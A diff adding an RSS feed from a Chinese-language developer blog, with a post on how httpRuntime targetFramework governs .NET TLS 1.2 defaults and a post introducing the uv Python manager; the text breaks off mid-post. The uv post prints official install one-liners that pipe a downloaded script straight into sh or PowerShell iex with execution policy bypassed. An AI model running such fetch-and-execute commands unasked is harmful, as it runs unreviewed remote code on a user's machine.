@@ -1,0 +1,1025 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:googleplay="http://www.google.com/schemas/play-podcasts/1.0" xmlns:media="http://www.rssboard.org/media-rss" version="2.0">
+  <channel>
+    <title><![CDATA[黑暗執行緒[RSS+]]]></title>
+    <link>undefined</link>
+    <image>
+      <url>https://blog.darkthread.net/img/icon512x512.png</url>
+      <title>黑暗執行緒[RSS+]</title>
+      <link>undefined</link>
+    </image>
+    <language>en-us</language>
+    <atom:link href="https://blog.darkthread.net/feed/rss/" rel="self" type="application/rss+xml"/>
+    <copyright><![CDATA[黑暗執行緒[RSS+]]]></copyright>
+    <itunes:author><![CDATA[黑暗執行緒[RSS+]]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[
+      黑暗執行緒部落格 - 一位在技術領域打滾多年老士官長的生活點滴<br />
+<br />
+<a href="https://blog.darkthread.net/feed/rss/" target="_blank">https://blog.darkthread.net/feed/rss/</a>
+      ]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[
+      黑暗執行緒部落格 - 一位在技術領域打滾多年老士官長的生活點滴<br />
+<br />
+<a href="https://blog.darkthread.net/feed/rss/" target="_blank">https://blog.darkthread.net/feed/rss/</a>
+      ]]>
+    </description>
+    <itunes:owner>
+      <itunes:name><![CDATA[黑暗執行緒[RSS+]]]></itunes:name>
+    </itunes:owner>
+    <itunes:image href="https://blog.darkthread.net/img/icon512x512.png"/>
+<item>
+    <title><![CDATA[【茶包射手日記】認識 web.config compilation 與 httpRuntime 的 targetFramework]]></title>
+    <link>https://blog.darkthread.net/blog/httruntime-targetframework/</link>
+    <itunes:title><![CDATA[【茶包射手日記】認識 web.config compilation 與 httpRuntime 的 targetFramework]]></itunes:title>
+    <itunes:author><![CDATA[service@darkthread.net (Jeffrey Lee)]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[<p>處理一枚 TLS 1.2 茶包，藉此釐清了一些 .NET Framework 版本觀念，筆記備忘。</p> <p>故事是有個 ASP.NET MVC / .NET Framework 4.5.2 網站，WebClient 連某個 HTTPS 網址時出現典型的 <code>基礎連接已關閉: 接收時發生未預期的錯誤 / 客戶端與伺服器無法溝通，因為它們沒有公用的演算法 (The client and server cannot communicate, because they do not possess a common algorithm)</code> 錯誤。很明顯是網站只支援 TLS 1.2，而 .NET 4.6+ 才預設使用 TLS 1.2 連線，解法有三種：</p> <ol><li>升級到 .NET Framework 4.6 以上版本 <a href="/blog/disable-tls-1-0-issues/">參考</a></li> <li>在程式碼加上 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12</li> <li>設定 SystemDefaultTlsVersions、SchUseStrongCrypto Registry <a href="/blog/net35-tls12-issue/">參考</a></li></ol> <p>我選擇第一種做法，將 ASP.NET MVC 網站升級到 4.8，重跑程式，卻照樣彈出「沒有公用的演算法」錯誤... 登楞! 莫非「.NET 4.6+ 預設改用 TLS 1.2」 的說法有誤，我還錯信了<a href="/blog/disable-tls-1-0-issues/">八年</a>?</p> <p>開了個全新 .NET 4.5.2 Console Application 測試以下程式，成功重現 TLS 連線錯誤；將版本改成 4.8 重新編譯執行都可成功，印證先前的認知並沒有錯!</p> <pre><code>static void Main(string[] args)
+{
+var attr = (TargetFrameworkAttribute)Attribute.GetCustomAttribute(
+typeof(Program).Assembly, typeof(TargetFrameworkAttribute));
+Console.WriteLine($"Target Framework: {attr?.FrameworkName ?? "Unknown"}");
+try
+{
+var wc = new WebClient();
+var resp = wc.DownloadString("https://owasp.org/");
+Console.WriteLine("HTTPS Request Succeeded.");
+}
+catch (Exception ex)
+{
+Console.WriteLine($"Error: {ex.Message}");
+}
+}
+</code></pre> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638953117033265747.png"></p> <p>那為什麼 ASP.NET MVC 已升級 4.8，卻沒有如預期預設改用 TLS 1.2?</p> <p>首先，複習幾個觀念：(參考資料：<a href="/blog/ref-higher-netfx-ver-dll/">.NET 4.6 專案可以參照及使用 .NET 4.8 編譯的程式庫嗎？</a>)</p> <ul><li>.NET 4.X 採「就地更新」(In-Place Update)政策，在安裝 .NET 4.8 的環境， 以 .NET 4.0、4.5、4.6、4.7、4.8 為目標編譯的程式都是在 .NET 4.8 版 Runtime 執行。</li> <li>.NET 4.5 安裝時會覆寫換掉 \Windows.NET Framework\V4.0.30319 的 .NET 4 舊版 dll，沿用相同目錄同樣檔名，置換成新版本。因此，安裝 .NET 4.5 後，即使是以 .NET 4 為目標編譯的程式，使用的也會是 .NET 4.5 版 Runtime 及系統組件。而 .NET 4.5.X、4.6.X、4.7.X、4.8 的升級也是依循相同模式。</li></ul> <p>所以，不管我是編譯成 .NET 4.8 或 4.5.2，其實使用的都是 4.8 的 Runtime 與系統套件。而我們在 Visual Studio 選取不同的 Target Framework，它會修改 .csproj 的 <code>&lt;TargetFrameworkVersion&gt;</code> 以及 app.config 的 supportRuntime sku Attribute：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638953117035287827.png"></p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638953117038459856.png"></p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638953117040070270.png"></p> <p>Visual Studio 在編譯時會依據 app.config 在執行檔加上 <code>[assembly: TargetFramework(".NETFramework,Version=v4.X", FrameworkDisplayName = ".NET Framework 4.X")]</code>，程式在執行時便會向下相容，模擬舊版本的行為。</p> <p>至於 ASP.NET Core 沒有 supportRuntime 可參照，所以會依據 web.config 的 compilation 及 httpRuntime 而定，問題主機的二者呈現衝突狀態，compilation 寫 4.8、但 httpRuntime 寫 4.5.2：</p> <pre><code>&lt;system.web&gt;
+&lt;compilation targetFramework="4.8" /&gt;
+&lt;httpRuntime targetFramework="4.5.2" /&gt;
+&lt;/system.web&gt;
+</code></pre> <p>compilation 的 targetFramework 決定 ASP.NET 動態編譯時的 .NET Framework 版本依據，設定 4.0，遇到 4.5+ 才支援的語法將會出錯。</p> <p>httpRuntime 的 targetFramework 則決定執行時期的 .NET 版本行為 (CLR 的 Quirks Mode 行為)，設定成 4.5.2 便會恢復 ServicePointManager.SecurityProtocol 預設舊版 SSL (非 TLS 1.2) 的行為，導致雖然 DLL 已升級成 4.8，在 ASP.NET 執行卻無法連上 TLS 1.2 網站的錯誤，結案!</p> <p>關於這部分的詳細介紹，推薦 .NET 部落格這篇文章：<a href="https://devblogs.microsoft.com/dotnet/all-about-httpruntime-targetframework/?WT.mc_id=DOP-MVP-37580">All about httpRuntime targetFramework by levibroderick / .NET Blog</a>。</p> <p data-slug="httruntime-targetframework" data-title-en="web.config httpRuntime targetFrramework" data-catg="Web Development" data-fbimg="https://images.pexels.com/photos/772689/pexels-photo-772689.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;h=750&amp;w=1260#750#1260">.NET Framework TLS 1.2 defaults depend on both runtime and httpRuntime targetFramework. Upgrading DLLs isn’t enough—httpRuntime must also target 4.6+ for default TLS 1.2 behavior.</p>]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[<p>處理一枚 TLS 1.2 茶包，藉此釐清了一些 .NET Framework 版本觀念，筆記備忘。</p> <p>故事是有個 ASP.NET MVC / .NET Framework 4.5.2 網站，WebClient 連某個 HTTPS 網址時出現典型的 <code>基礎連接已關閉: 接收時發生未預期的錯誤 / 客戶端與伺服器無法溝通，因為它們沒有公用的演算法 (The client and server cannot communicate, because they do not possess a common algorithm)</code> 錯誤。很明顯是網站只支援 TLS 1.2，而 .NET 4.6+ 才預設使用 TLS 1.2 連線，解法有三種：</p> <ol><li>升級到 .NET Framework 4.6 以上版本 <a href="/blog/disable-tls-1-0-issues/">參考</a></li> <li>在程式碼加上 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12</li> <li>設定 SystemDefaultTlsVersions、SchUseStrongCrypto Registry <a href="/blog/net35-tls12-issue/">參考</a></li></ol> <p>我選擇第一種做法，將 ASP.NET MVC 網站升級到 4.8，重跑程式，卻照樣彈出「沒有公用的演算法」錯誤... 登楞! 莫非「.NET 4.6+ 預設改用 TLS 1.2」 的說法有誤，我還錯信了<a href="/blog/disable-tls-1-0-issues/">八年</a>?</p> <p>開了個全新 .NET 4.5.2 Console Application 測試以下程式，成功重現 TLS 連線錯誤；將版本改成 4.8 重新編譯執行都可成功，印證先前的認知並沒有錯!</p> <pre><code>static void Main(string[] args)
+{
+var attr = (TargetFrameworkAttribute)Attribute.GetCustomAttribute(
+typeof(Program).Assembly, typeof(TargetFrameworkAttribute));
+Console.WriteLine($"Target Framework: {attr?.FrameworkName ?? "Unknown"}");
+try
+{
+var wc = new WebClient();
+var resp = wc.DownloadString("https://owasp.org/");
+Console.WriteLine("HTTPS Request Succeeded.");
+}
+catch (Exception ex)
+{
+Console.WriteLine($"Error: {ex.Message}");
+}
+}
+</code></pre> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638953117033265747.png"></p> <p>那為什麼 ASP.NET MVC 已升級 4.8，卻沒有如預期預設改用 TLS 1.2?</p> <p>首先，複習幾個觀念：(參考資料：<a href="/blog/ref-higher-netfx-ver-dll/">.NET 4.6 專案可以參照及使用 .NET 4.8 編譯的程式庫嗎？</a>)</p> <ul><li>.NET 4.X 採「就地更新」(In-Place Update)政策，在安裝 .NET 4.8 的環境， 以 .NET 4.0、4.5、4.6、4.7、4.8 為目標編譯的程式都是在 .NET 4.8 版 Runtime 執行。</li> <li>.NET 4.5 安裝時會覆寫換掉 \Windows.NET Framework\V4.0.30319 的 .NET 4 舊版 dll，沿用相同目錄同樣檔名，置換成新版本。因此，安裝 .NET 4.5 後，即使是以 .NET 4 為目標編譯的程式，使用的也會是 .NET 4.5 版 Runtime 及系統組件。而 .NET 4.5.X、4.6.X、4.7.X、4.8 的升級也是依循相同模式。</li></ul> <p>所以，不管我是編譯成 .NET 4.8 或 4.5.2，其實使用的都是 4.8 的 Runtime 與系統套件。而我們在 Visual Studio 選取不同的 Target Framework，它會修改 .csproj 的 <code>&lt;TargetFrameworkVersion&gt;</code> 以及 app.config 的 supportRuntime sku Attribute：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638953117035287827.png"></p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638953117038459856.png"></p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638953117040070270.png"></p> <p>Visual Studio 在編譯時會依據 app.config 在執行檔加上 <code>[assembly: TargetFramework(".NETFramework,Version=v4.X", FrameworkDisplayName = ".NET Framework 4.X")]</code>，程式在執行時便會向下相容，模擬舊版本的行為。</p> <p>至於 ASP.NET Core 沒有 supportRuntime 可參照，所以會依據 web.config 的 compilation 及 httpRuntime 而定，問題主機的二者呈現衝突狀態，compilation 寫 4.8、但 httpRuntime 寫 4.5.2：</p> <pre><code>&lt;system.web&gt;
+&lt;compilation targetFramework="4.8" /&gt;
+&lt;httpRuntime targetFramework="4.5.2" /&gt;
+&lt;/system.web&gt;
+</code></pre> <p>compilation 的 targetFramework 決定 ASP.NET 動態編譯時的 .NET Framework 版本依據，設定 4.0，遇到 4.5+ 才支援的語法將會出錯。</p> <p>httpRuntime 的 targetFramework 則決定執行時期的 .NET 版本行為 (CLR 的 Quirks Mode 行為)，設定成 4.5.2 便會恢復 ServicePointManager.SecurityProtocol 預設舊版 SSL (非 TLS 1.2) 的行為，導致雖然 DLL 已升級成 4.8，在 ASP.NET 執行卻無法連上 TLS 1.2 網站的錯誤，結案!</p> <p>關於這部分的詳細介紹，推薦 .NET 部落格這篇文章：<a href="https://devblogs.microsoft.com/dotnet/all-about-httpruntime-targetframework/?WT.mc_id=DOP-MVP-37580">All about httpRuntime targetFramework by levibroderick / .NET Blog</a>。</p> <p data-slug="httruntime-targetframework" data-title-en="web.config httpRuntime targetFrramework" data-catg="Web Development" data-fbimg="https://images.pexels.com/photos/772689/pexels-photo-772689.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;h=750&amp;w=1260#750#1260">.NET Framework TLS 1.2 defaults depend on both runtime and httpRuntime targetFramework. Upgrading DLLs isn’t enough—httpRuntime must also target 4.6+ for default TLS 1.2 behavior.</p>]]>
+    </description>
+    <content:encoded><![CDATA[<p>處理一枚 TLS 1.2 茶包，藉此釐清了一些 .NET Framework 版本觀念，筆記備忘。</p> <p>故事是有個 ASP.NET MVC / .NET Framework 4.5.2 網站，WebClient 連某個 HTTPS 網址時出現典型的 <code>基礎連接已關閉: 接收時發生未預期的錯誤 / 客戶端與伺服器無法溝通，因為它們沒有公用的演算法 (The client and server cannot communicate, because they do not possess a common algorithm)</code> 錯誤。很明顯是網站只支援 TLS 1.2，而 .NET 4.6+ 才預設使用 TLS 1.2 連線，解法有三種：</p> <ol><li>升級到 .NET Framework 4.6 以上版本 <a href="/blog/disable-tls-1-0-issues/">參考</a></li> <li>在程式碼加上 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12</li> <li>設定 SystemDefaultTlsVersions、SchUseStrongCrypto Registry <a href="/blog/net35-tls12-issue/">參考</a></li></ol> <p>我選擇第一種做法，將 ASP.NET MVC 網站升級到 4.8，重跑程式，卻照樣彈出「沒有公用的演算法」錯誤... 登楞! 莫非「.NET 4.6+ 預設改用 TLS 1.2」 的說法有誤，我還錯信了<a href="/blog/disable-tls-1-0-issues/">八年</a>?</p> <p>開了個全新 .NET 4.5.2 Console Application 測試以下程式，成功重現 TLS 連線錯誤；將版本改成 4.8 重新編譯執行都可成功，印證先前的認知並沒有錯!</p> <pre><code>static void Main(string[] args)
+{
+var attr = (TargetFrameworkAttribute)Attribute.GetCustomAttribute(
+typeof(Program).Assembly, typeof(TargetFrameworkAttribute));
+Console.WriteLine($"Target Framework: {attr?.FrameworkName ?? "Unknown"}");
+try
+{
+var wc = new WebClient();
+var resp = wc.DownloadString("https://owasp.org/");
+Console.WriteLine("HTTPS Request Succeeded.");
+}
+catch (Exception ex)
+{
+Console.WriteLine($"Error: {ex.Message}");
+}
+}
+</code></pre> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638953117033265747.png"></p> <p>那為什麼 ASP.NET MVC 已升級 4.8，卻沒有如預期預設改用 TLS 1.2?</p> <p>首先，複習幾個觀念：(參考資料：<a href="/blog/ref-higher-netfx-ver-dll/">.NET 4.6 專案可以參照及使用 .NET 4.8 編譯的程式庫嗎？</a>)</p> <ul><li>.NET 4.X 採「就地更新」(In-Place Update)政策，在安裝 .NET 4.8 的環境， 以 .NET 4.0、4.5、4.6、4.7、4.8 為目標編譯的程式都是在 .NET 4.8 版 Runtime 執行。</li> <li>.NET 4.5 安裝時會覆寫換掉 \Windows.NET Framework\V4.0.30319 的 .NET 4 舊版 dll，沿用相同目錄同樣檔名，置換成新版本。因此，安裝 .NET 4.5 後，即使是以 .NET 4 為目標編譯的程式，使用的也會是 .NET 4.5 版 Runtime 及系統組件。而 .NET 4.5.X、4.6.X、4.7.X、4.8 的升級也是依循相同模式。</li></ul> <p>所以，不管我是編譯成 .NET 4.8 或 4.5.2，其實使用的都是 4.8 的 Runtime 與系統套件。而我們在 Visual Studio 選取不同的 Target Framework，它會修改 .csproj 的 <code>&lt;TargetFrameworkVersion&gt;</code> 以及 app.config 的 supportRuntime sku Attribute：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638953117035287827.png"></p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638953117038459856.png"></p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638953117040070270.png"></p> <p>Visual Studio 在編譯時會依據 app.config 在執行檔加上 <code>[assembly: TargetFramework(".NETFramework,Version=v4.X", FrameworkDisplayName = ".NET Framework 4.X")]</code>，程式在執行時便會向下相容，模擬舊版本的行為。</p> <p>至於 ASP.NET Core 沒有 supportRuntime 可參照，所以會依據 web.config 的 compilation 及 httpRuntime 而定，問題主機的二者呈現衝突狀態，compilation 寫 4.8、但 httpRuntime 寫 4.5.2：</p> <pre><code>&lt;system.web&gt;
+&lt;compilation targetFramework="4.8" /&gt;
+&lt;httpRuntime targetFramework="4.5.2" /&gt;
+&lt;/system.web&gt;
+</code></pre> <p>compilation 的 targetFramework 決定 ASP.NET 動態編譯時的 .NET Framework 版本依據，設定 4.0，遇到 4.5+ 才支援的語法將會出錯。</p> <p>httpRuntime 的 targetFramework 則決定執行時期的 .NET 版本行為 (CLR 的 Quirks Mode 行為)，設定成 4.5.2 便會恢復 ServicePointManager.SecurityProtocol 預設舊版 SSL (非 TLS 1.2) 的行為，導致雖然 DLL 已升級成 4.8，在 ASP.NET 執行卻無法連上 TLS 1.2 網站的錯誤，結案!</p> <p>關於這部分的詳細介紹，推薦 .NET 部落格這篇文章：<a href="https://devblogs.microsoft.com/dotnet/all-about-httpruntime-targetframework/?WT.mc_id=DOP-MVP-37580">All about httpRuntime targetFramework by levibroderick / .NET Blog</a>。</p> <p data-slug="httruntime-targetframework" data-title-en="web.config httpRuntime targetFrramework" data-catg="Web Development" data-fbimg="https://images.pexels.com/photos/772689/pexels-photo-772689.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;h=750&amp;w=1260#750#1260">.NET Framework TLS 1.2 defaults depend on both runtime and httpRuntime targetFramework. Upgrading DLLs isn’t enough—httpRuntime must also target 4.6+ for default TLS 1.2 behavior.</p>]]></content:encoded>
+    <itunes:image href="https://blog.darkthread.net/Posts/files/2025/Fig1_638953117033265747.png"/>
+          <media:content url="https://blog.darkthread.net/Posts/files/2025/Fig1_638953117033265747.png" medium="image"/>
+    <pubDate>Mon, 06 Oct 2025 01:40:07 GMT</pubDate>
+  </item><item>
+    <title><![CDATA[一次搞定 Python 版本管理/套件安裝/虛擬環境的極速神器 - uv]]></title>
+    <link>https://blog.darkthread.net/blog/uv/</link>
+    <itunes:title><![CDATA[一次搞定 Python 版本管理/套件安裝/虛擬環境的極速神器 - uv]]></itunes:title>
+    <itunes:author><![CDATA[service@darkthread.net (Jeffrey Lee)]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[<p>前幾天分享 <a href="/blog/pyenv-win-n-wsl/">Windows 與 WSL 的 pyenv 衝突</a>的事，結果臉書跟部落格的留言區，大家排山倒海地強推 uv! (感謝大家推薦，此處就不一一言謝了)</p> <p>這狀況似曾相識，上回是<a href="/blog/k6-load-testing/">介紹完 JMeter 後被網友大推 K6</a>，一試之後果真如沐春風，相見恨晚... 這回我有預感，我也馬上就要愛上 uv 了~</p> <p><a href="https://docs.astral.sh/uv/">uv</a> 是一款由 Astral 團隊用 Rust 語言開發的現代化 Python 套件管理及專案管理工具。</p> <p>題外話：其實光是 Rust 開發這點就叫我心動了 (延伸閱讀：<a href="/blog/rust-in-js-ecosystem/">Rust 程式語言在 JavaScript 生態圈的角色</a>)，Rust 是強大又安全的程式語言，效能趨近 C/C++ 卻有防彈等級的記憶體安全性。但 Rust 的學習曲線偏陡峭，開發時必須與編譯器不斷鬥智鬥勇，需投入可觀時間精力方能上手，具備一定聰慧、決心與毅力才能駕御，特別吸引追求自我實現的開發者，只留給願意爬過天堂路享受特種部隊榮耀的那群人。也因為成為 Rust 開發者條件嚴苛，至今看過的 Rust 作品在效能與品質上都不曾讓人失望，因此讓我對 Rust 開發的軟體特別有好感。</p> <p>uv 的定位與之前學過的 pyenv、pip、venv 有點不同，它不只解決版本管理或套件安裝的單一需求，而是要打造出全方位的解決方案，一次取代 pip, pip-tools, pipx, poetry, pyenv, twine, virtualenv 等眾多工具。uv 整合了套件安裝、依賴管理、虛擬環境管理以及 Python 版本管理等功能，相較於傳統工具，uv 的套件安裝和依賴解析速度加快了 10 到 100 倍，而支援跨平台使用（macOS、Linux、Windows）當然也不在話下。</p> <p>uv 安裝套件之所以能快如閃電的關鍵，源自 Rust 語言的高效率、並行處理與智慧化快取，以及對打包格式與解析流程的低階最佳化。以下簡要說明：</p> <ol><li>Rust 採單一靜態執行檔，比反覆啟動 Python 解譯器快 N 倍，延遲能從數百 ms 降到 µs。</li> <li>下載、解壓與中繼資料擷取採分層並行，比起循序處理能省下超可觀的等待。</li> <li>透過全域快取，uv 會沿用已下載與已建置好的分發檔，在暖快取(之前下載過)情境能加快百倍，冷快取(從未下載過)時也能快 8-10 倍。<br> (註：此點深得我心，每個虛擬環境 pip install 重新下載安裝多複製一份，對時間跟空間都是浪費)</li> <li>針對 wheel 檔，會先讀取中央目錄、檔案表取得 dist-info/metadata，與快取現況比較，只下載短缺部分不需整檔下載，大幅減少網路傳輸量與等待時間。<br> (註：Wheel 檔是 Python 的標準二進位散布格式，是帶有特定命名與中繼資料結構的 ZIP 檔，安裝時可直接解壓到 site-packages 而不需現場編譯)</li> <li>建立虛擬環境與安裝檔案時會運用 Hard Link 與複製時寫入 (Copy-on-Write) 等技術，降低磁碟 I/O 與空間重複，並以原子方式更新確保一致性。</li> <li>直接以檔案系統底層機制操作管理 venv，避免中間層成本並可提升建立/切換速度，比透過 Python 的 venv 模組更有效率。</li> <li>採用 PubGrub 的 Rust 實作 (pubgrub-rs) 擔任版本求解器，具增量、決定性與偏好自鎖檔版本的策略，在解析過程中可預取相關套件中繼資料，消除網路延遲。</li></ol> <p>整理完 uv 特色讓我熱血沸騰，接著來實際用看看。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig6_638948424619862659.jpg" alt="thumbnail"></p> <h3>安裝 uv</h3> <p>安裝超簡單，macOS/Liunx <code>curl -LsSf https://astral.sh/uv/install.sh | sh</code>、Windows <code>powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"</code> (也可用 winget/scoop ) 都是一行搞定。</p> <p>我在 WSL 測試，安裝速度很快，不到三秒完成。裝完重新登入或 <code>source $HOME/.local/bin/env</code> 即可使用 uv CLI。</p> <h3>安裝 Python</h3> <p>開始前先 <code>uv python install</code> 安裝最新版 Python，只花了 5.5s... 快到我有點不習慣。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638948424621465463.png"></p> <p>註：以上安裝方法只會安裝 python3.13，若要將不帶版號的別名 (python、python3) 指向該版本，可加上參數 <code>uv python install --default</code>。</p> <h3>執行 Python 程式</h3> <p>執行程式不再是用 <code>python &lt;py-file-path&gt; &lt;args...&gt;</code>，要改用 <code>uv run &lt;py-file-path&gt; &lt;args...&gt;</code></p> <pre><code>uv run test.py
+uv run test.py "arg1" "arg2"
+# bash
+echo 'print("hello world!")' | uv run -
+uv run - &lt;&lt;EOF
+print("hello world!")
+EOF
+# cmd
+echo print("hello world!") | uv run -
+# PowerShell
+@"
+print("hello world!")
+"@ | uv run -
+</code></pre> <p>有個小技巧是可以直接把 Python 程式寫成腳本，例如新增一個 greet 文字檔，寫入以下內容再 <code>chmod u+x greet</code>：</p> <pre><code>#!/usr/bin/env -S uv run --script
+print("Hello, world!")
+</code></pre> <p>greet 便可以比照 bash 腳本直接執行，很酷。</p> <h3>下載套件</h3> <p>對於複雜應用，<a href="https://blog.kyomind.tw/pyproject-toml/">pyproject.toml 專案檔</a> 可定義 Python 專案，uv 將依據它下載依賴的套件。對於單一 .py 檔，我們可以透過 --with 參數指定要下載的依賴套件。</p> <pre><code># example.py
+import time
+from rich.progress import track
+for i in track(range(20), description="For example:"):
+time.sleep(0.05)
+# 執行
+uv run --with rich exmaple.py
+</code></pre> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638948424623089676.png"></p> <p>另一個更方便的做法是用 --script 在 .py 開頭加入宣告，例如 <code>uv add --script example.py 'requests&lt;3' 'rich'</code>，程式最前方會有一段註刪起來的宣告語法，之後不用加 --with 參數 uv 也會依據這段宣告自動下載安裝依賴的套件：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638948424624769221.png"></p> <p>另外，在宣告區也可指定需要的 Python 版本：</p> <pre><code># /// script
+# requires-python = "&gt;=3.12"
+# dependencies = []
+# ///
+# Use some syntax added in Python 3.12
+type Point = tuple[float, float]
+print(Point)
+</code></pre> <h3>虛擬環境 (venv)</h3> <p>uv 也支援虛擬環境，但做法更先進，它會利用 Hard-Link 取代下載及複製重複的檔案到每個虛擬環境資料夾，節省寶貴空間。</p> <pre><code>uv venv # 用 .venv 資料夾建立虛擬環境
+uv venv --python 3.11 # 指定 Python 版本
+uv pip install ruff # 在虛擬環境安裝套件
+source .venv/bin/activate # 啟用虛擬環境
+# .venv\Scripts\activate # Windows
+deactivate # 退出虛擬環境
+</code></pre> <h3>快如閃電的套件安裝</h3> <p>接下來仔細說說 uv 讓套件安裝部署又快又好的祕密。我對這段格外好奇，便花了點時研究。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638948424626434283.png"><br> 安裝 pandas 及 numpy 只花 51ms!!!</p> <ol><li>Hard Link 重複使用<br> uv 會將 wheel 等套件內容集中放在全域快取目錄 (例如 ~/.cache/uv)，在虛擬環境安裝 pip install 套件時不複製檔案，而是以硬連結把快取中的檔案「連結」到虛擬環境的 site-packages，因此多個環境都共用一份實體資料，不重複下載、不複製資料、不佔磁碟空間。<br> 以 numpy 的 __init__.pyi 為例，用 ls -il 多顯示 inode 編號，可發現 <code>~/uv-lab/.venv/lib64/python3.13/site-packages/numpy/__init__.pyi</code> 與 <code>~/.cache/uv/archive-v0/vLaE7thhKt3kchyCXSCl3/numpy/__init__.pyi</code> 的 inode 編號相同都是 47044，代表這兩個檔案指向同一磁碟位址，實際上只有一份資料。而用 <code>find ~/ -xdev -inum 47044</code> 反查，一樣能證明兩個路徑都指向同一份檔案內容。<br> <img src="https://blog.darkthread.net/Posts/files/2025/Fig5_638948424628103424.png"><br> 註：Hard-Link 限定同一磁碟分割，若虛擬環境與快取位於不同磁碟，uv 將退回複製檔案之傳統做法並提出警示： <img src="Fig6.png"> 延伸閱讀：<a href="https://blog.miniasp.com/post/2025/01/02/symbolic-link-hard-link-directory-junction">理解 Symbolic Link、Hard Link 與 Directory Junction 的差異之處 by 保哥</a></li> <li>原子化部署<br> uv 進行安裝/同步時，能像資料庫 Transaction 一樣，做到要嘛全部成功，要嘛失敗全部復原，不會出現下載一半或複製一半的情況。<br> 其做法是先在臨時位置完成檔案展開與結構寫入，待驗證完成後再以整批移動或替換目標路徑，確保過程中如遇中斷不會留下半成品或破壞既有可用環境。<br> 而這個設計也跟 uv 的平行處理與快取機制有關，由於檔案可能多人多處共用，故要先在隔離的臨時區並行完成解壓、連結與索引更新，再一次切換，有效降低 I/O 衝突及部分安裝的風險，確保使用者不會看到一半已更新、一半未更新的狀況。</li></ol> <p>必須說，這真是精巧的設計，使用者看不到，只會感受到又快又穩定。</p> <h3>結論</h3> <p>不用說，我被圈粉了! 今天起應該就會逐步改用 uv 取代原有的 Python 開發方式。</p> <p>而現在我也已加入推坑行列：uv 真的好好用，不試看看嗎？</p> <p data-slug="uv" data-title-en="Fast Python package and project manager - uv" data-catg="Python" data-fbimg="https://cdn.pixabay.com/photo/2015/09/08/21/02/superbike-930715_960_720.jpg#960#720">Introducing uv: a lightning-fast, Rust-based Python package and environment manager. Installs, manages, and runs projects efficiently, replacing many traditional tools.</p>]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[<p>前幾天分享 <a href="/blog/pyenv-win-n-wsl/">Windows 與 WSL 的 pyenv 衝突</a>的事，結果臉書跟部落格的留言區，大家排山倒海地強推 uv! (感謝大家推薦，此處就不一一言謝了)</p> <p>這狀況似曾相識，上回是<a href="/blog/k6-load-testing/">介紹完 JMeter 後被網友大推 K6</a>，一試之後果真如沐春風，相見恨晚... 這回我有預感，我也馬上就要愛上 uv 了~</p> <p><a href="https://docs.astral.sh/uv/">uv</a> 是一款由 Astral 團隊用 Rust 語言開發的現代化 Python 套件管理及專案管理工具。</p> <p>題外話：其實光是 Rust 開發這點就叫我心動了 (延伸閱讀：<a href="/blog/rust-in-js-ecosystem/">Rust 程式語言在 JavaScript 生態圈的角色</a>)，Rust 是強大又安全的程式語言，效能趨近 C/C++ 卻有防彈等級的記憶體安全性。但 Rust 的學習曲線偏陡峭，開發時必須與編譯器不斷鬥智鬥勇，需投入可觀時間精力方能上手，具備一定聰慧、決心與毅力才能駕御，特別吸引追求自我實現的開發者，只留給願意爬過天堂路享受特種部隊榮耀的那群人。也因為成為 Rust 開發者條件嚴苛，至今看過的 Rust 作品在效能與品質上都不曾讓人失望，因此讓我對 Rust 開發的軟體特別有好感。</p> <p>uv 的定位與之前學過的 pyenv、pip、venv 有點不同，它不只解決版本管理或套件安裝的單一需求，而是要打造出全方位的解決方案，一次取代 pip, pip-tools, pipx, poetry, pyenv, twine, virtualenv 等眾多工具。uv 整合了套件安裝、依賴管理、虛擬環境管理以及 Python 版本管理等功能，相較於傳統工具，uv 的套件安裝和依賴解析速度加快了 10 到 100 倍，而支援跨平台使用（macOS、Linux、Windows）當然也不在話下。</p> <p>uv 安裝套件之所以能快如閃電的關鍵，源自 Rust 語言的高效率、並行處理與智慧化快取，以及對打包格式與解析流程的低階最佳化。以下簡要說明：</p> <ol><li>Rust 採單一靜態執行檔，比反覆啟動 Python 解譯器快 N 倍，延遲能從數百 ms 降到 µs。</li> <li>下載、解壓與中繼資料擷取採分層並行，比起循序處理能省下超可觀的等待。</li> <li>透過全域快取，uv 會沿用已下載與已建置好的分發檔，在暖快取(之前下載過)情境能加快百倍，冷快取(從未下載過)時也能快 8-10 倍。<br> (註：此點深得我心，每個虛擬環境 pip install 重新下載安裝多複製一份，對時間跟空間都是浪費)</li> <li>針對 wheel 檔，會先讀取中央目錄、檔案表取得 dist-info/metadata，與快取現況比較，只下載短缺部分不需整檔下載，大幅減少網路傳輸量與等待時間。<br> (註：Wheel 檔是 Python 的標準二進位散布格式，是帶有特定命名與中繼資料結構的 